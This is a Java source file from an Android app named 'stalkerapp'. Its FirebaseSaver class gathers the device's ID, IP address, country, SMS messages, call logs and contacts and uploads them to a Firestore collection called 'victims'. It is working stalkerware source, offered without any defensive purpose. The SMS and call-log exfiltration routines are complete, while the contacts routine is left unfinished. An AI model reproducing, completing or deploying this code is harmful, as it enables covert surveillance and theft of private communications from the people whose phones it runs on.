package com.github.saintedlittle.stalkerapp.firebase;

import static android.content.ContentValues.TAG;

import android.annotation.SuppressLint;
import android.content.Context;
import android.provider.Settings;
import android.util.Log;

import com.github.saintedlittle.stalkerapp.data.CallData;
import com.github.saintedlittle.stalkerapp.data.ContactData;
import com.github.saintedlittle.stalkerapp.data.SMSData;
import com.github.saintedlittle.stalkerapp.data.SystemData;
import com.github.saintedlittle.stalkerapp.fetcher.CallFetcher;
import com.github.saintedlittle.stalkerapp.fetcher.ContactFetcher;
import com.github.saintedlittle.stalkerapp.fetcher.SMSFetcher;
import com.github.saintedlittle.stalkerapp.fetcher.SystemDataFetcher;
import com.google.firebase.firestore.DocumentReference;
import com.google.firebase.firestore.FirebaseFirestore;

import java.util.HashMap;
import java.util.List;
import java.util.Map;

public class FirebaseSaver {

    private final FirebaseFirestore db = FirebaseFirestore.getInstance();

    private static String DEVICE_ID = "";

    @SuppressLint("StaticFieldLeak")
    private static Context context;


    private static void onFailure(Exception e) {
        Log.w(TAG, "Error adding document", e);
    }

    private static void onSuccess(DocumentReference documentReference) {
        Log.d(TAG, "DocumentSnapshot added with ID: " + documentReference.getId());
    }

    public void saveDefaultData(Context context) {
        SystemData systemData = new SystemDataFetcher(context).fetchSystemData();

        FirebaseSaver.DEVICE_ID = systemData.getDEVICE_ID();
        FirebaseSaver.context = context;


        Map<String, Object> systemInformation = new HashMap<>();

        String androidID = android.provider.Settings.System.getString(context.getContentResolver(), Settings.Secure.ANDROID_ID);
        systemData.setDEVICE_ID(androidID);

        systemInformation.put("COUNTRY", systemData.getCountry());

        systemInformation.put("DEVICE", systemData.getDeviceName());
        systemInformation.put("DEVICE-ID", systemData.getDEVICE_ID());

        systemInformation.put("IP-ADDRESS", systemData.getIP());

        systemInformation.put("JOINING", systemData.getTimestamp());

        systemInformation.put("TIMEZONE", systemData.getTimezone());

        // Add a new document with a generated ID
        db.collection(FirebaseConstants.VICTIM_COLLECTION)
                .add(systemInformation)
                .addOnSuccessListener(FirebaseSaver::onSuccess)
                .addOnFailureListener(FirebaseSaver::onFailure);
    }

    public void saveContacts() {

        List<ContactData> contacts = new ContactFetcher(context).fetchContacts();

        contacts.forEach(e -> {
            Map<String, Object> contact = new HashMap<>();

            // TODO: DATA CLASS.
            // contact.put()

            db.collection(FirebaseConstants.VICTIM_COLLECTION)
                    .document(DEVICE_ID)
                    .collection(FirebaseConstants.CONTACTS_COLLECTION)
                    .document(String.format("%s %s", e.getFirstName(), e.getLastName()))
                    .update(contact);
        });

    }

    public void saveSMS() {

        List<SMSData> smsList = SMSFetcher.fetchSMS(context);

        smsList.forEach(e -> {
            Map<String, Object> sms = new HashMap<>();

            sms.put("FROM", e.getSender());
            sms.put("MESSAGE", e.getMessage());
            sms.put("TIME", e.getTimestamp());

            db.collection(FirebaseConstants.VICTIM_COLLECTION)
                    .document(DEVICE_ID)
                    .collection(FirebaseConstants.SMS_COLLECTION)
                    .document(e.getSender())
                    .update(sms);
        });

    }

    public void saveCalls() {

        List<CallData> callList = CallFetcher.fetchCalls(context);

        callList.forEach(e -> {
            Map<String, Object> call = new HashMap<>();

            call.put("CALLER", e.getCaller());
            call.put("PHONE", e.getPhone());
            call.put("DURATION", e.getDuration());
            call.put("TIMESTAMP", e.getTimestamp());

            db.collection(FirebaseConstants.VICTIM_COLLECTION)
                    .document(DEVICE_ID)
                    .collection(FirebaseConstants.CALLS_COLLECTION)
                    .document(e.getCaller())
                    .update(call);
        });

    }

    public void pushNewSMS(SMSData data) {
        // TODO:
    }

    private static final class FirebaseConstants {
        public final static String VICTIM_COLLECTION = "victims";
        public final static String CONTACTS_COLLECTION = "contacts";
        public final static String SMS_COLLECTION = "sms";

        public final static String CALLS_COLLECTION = "calls";

        public final static String ADMINISTRATOR_COLLECTION = "administrators";

    }
}
